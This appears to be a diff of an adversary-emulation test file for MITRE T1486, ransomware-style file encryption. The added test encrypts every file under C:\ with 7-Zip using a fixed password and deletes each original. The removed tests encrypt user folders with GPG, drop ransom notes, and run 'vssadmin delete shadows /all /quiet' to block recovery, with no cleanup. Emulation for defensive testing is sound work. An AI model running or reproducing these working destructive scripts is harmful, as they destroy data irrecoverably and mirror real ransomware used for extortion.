@@ -1,132 +1,37 @@
-attack_technique_name: Data Encrypted for Impact
 attack_technique: T1486
-display_name: Data Encrypted for Impact
+display_name: Data Encrypted for Impact - Destructive Custom
+
 atomic_tests:
-  - name: Encrypt Files Using GPG4Win (Ransomware Simulation)
-    auto_generated_guid: 4541e2c2-33c8-44b1-be79-9161440f1718
-    description: >
-      Uses GPG4Win to encrypt files recursively in critical directories
-      (e.g., C:\Users) and deletes originals.
+  - name: Encrypt files on C drive with 7zip (destructive)
+    auto_generated_guid: e7c6b38c-3c42-4a2e-bf89-c1e6a2c6e011
+    description: |
+      Simulates ransomware behavior by encrypting all files under C:\ using 7-Zip.
+      ⚠️ This is a **destructive test**. Use in disposable environments only.
     supported_platforms:
       - windows
     input_arguments:
-      GPG_Exe_Location:
-        description: Path of the GPG program
-        type: path
-        default: C:\Program Files (x86)\GnuPG\bin\gpg.exe
-      Target_Directory:
-        description: Directory to encrypt files
-        type: path
-        default: C:\Users
-      Passphrase:
-        description: Passphrase for encryption
+      target_path:
+        description: Path to encrypt
         type: string
-        default: MySecretKey123
+        default: "C:\\"
+      password:
+        description: Password used for encryption
+        type: string
+        default: "ChaymaOumayma2025"
     dependencies:
-      - description: >
-          GPG must exist at (#{GPG_Exe_Location}). If -GetPrereqs fails, try
-          to install GPG4WIN manually at
-          'https://www.gpg4win.org/download.html'. Once done, run -CheckPrereqs
-          to confirm that it works.
+      - description: 7z.exe must be available in the PATH
         prereq_command: |
-          if (test-path '#{GPG_Exe_Location}'){exit 0} else {exit 1}
-        get_prereq_command: >
-          New-Item -Type Directory
-          "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force
-          | Out-Null
-
-          Invoke-WebRequest "https://files.gpg4win.org/gpg4win-4.1.0.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe"
-
-          cmd /c "PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe" /S
+          if (Get-Command 7z.exe -ErrorAction SilentlyContinue) {exit 0} else {exit 1}
+        get_prereq_command: |
+          Write-Host "Download and install 7-Zip from https://www.7-zip.org/"
     executor:
       name: powershell
       elevation_required: true
-      command: >
-        $gpgPath = "#{GPG_Exe_Location}"
-
-        $targetDir = "#{Target_Directory}"
-
-        $passphrase = "#{Passphrase}"
-
-
-        # Recursively encrypt all files in the target directory
-
-        Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
-            $filePath = $_.FullName
-            $encryptedFilePath = $filePath + ".gpg"
-            Start-Process -FilePath $gpgPath -ArgumentList "--batch --yes --passphrase '$passphrase' -c `"$filePath`"" -NoNewWindow -Wait
-            Remove-Item -Path $filePath -Force  # Delete the original file
-            Write-Host "Encrypted and deleted: $filePath"
+      command: |
+        $ErrorActionPreference = "SilentlyContinue"
+        $files = Get-ChildItem -Path "#{target_path}" -Recurse -File
+        foreach ($file in $files) {
+          $zipPath = "$($file.FullName).7z"
+          & 7z.exe a -p#{password} -mhe=on "$zipPath" "$($file.FullName)" | Out-Null
+          Remove-Item "$($file.FullName)" -Force
         }
-
-
-        # Create a ransom note
-
-        $ransomNote = @"
-
-        YOUR FILES HAVE BEEN ENCRYPTED!
-
-        To decrypt your files, contact us at fake@ransomware.com
-
-        and provide the passphrase: $passphrase.
-
-        "@
-
-        Set-Content -Path "$targetDir\READ_ME.txt" -Value $ransomNote
-
-        Write-Host "Ransom note created at $targetDir\READ_ME.txt"
-
-
-        # Delete shadow copies to inhibit recovery
-
-        vssadmin delete shadows /all /quiet
-
-        Write-Host "Shadow copies deleted."
-      cleanup_command: |
-        # No cleanup command (leave files encrypted and system damaged)
-  - name: Akira Ransomware Drop Files with .akira Extension and Ransom Note
-    auto_generated_guid: ab3f793f-2dcc-4da5-9c71-34988307263f
-    description: >
-      Simulates Akira ransomware by dropping encrypted files with .akira
-      extension and creating a ransom note.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: true
-      command: >
-        # Generate 100 encrypted files with random content
-
-        1..100 | ForEach-Object {
-            $out = New-Object Byte[] 1MB
-            (New-Object Random).NextBytes($out)
-            [IO.File]::WriteAllBytes("C:\test.$_.akira", $out)
-        }
-
-        Write-Host "Generated 100 encrypted files with .akira extension."
-
-
-        # Create a ransom note
-
-        $ransomNote = @"
-
-        YOUR FILES HAVE BEEN ENCRYPTED!
-
-        To decrypt your files, contact us at fake@ransomware.com
-
-        and provide the decryption key located in secret.key.
-
-        "@
-
-        Set-Content -Path "$env:UserProfile\Desktop\akira_readme.txt" -Value $ransomNote
-
-        Write-Host "Ransom note created at $env:UserProfile\Desktop\akira_readme.txt"
-
-
-        # Delete shadow copies to inhibit recovery
-
-        vssadmin delete shadows /all /quiet
-
-        Write-Host "Shadow copies deleted."
-      cleanup_command: |
-        # No cleanup command (leave files encrypted and system damaged)
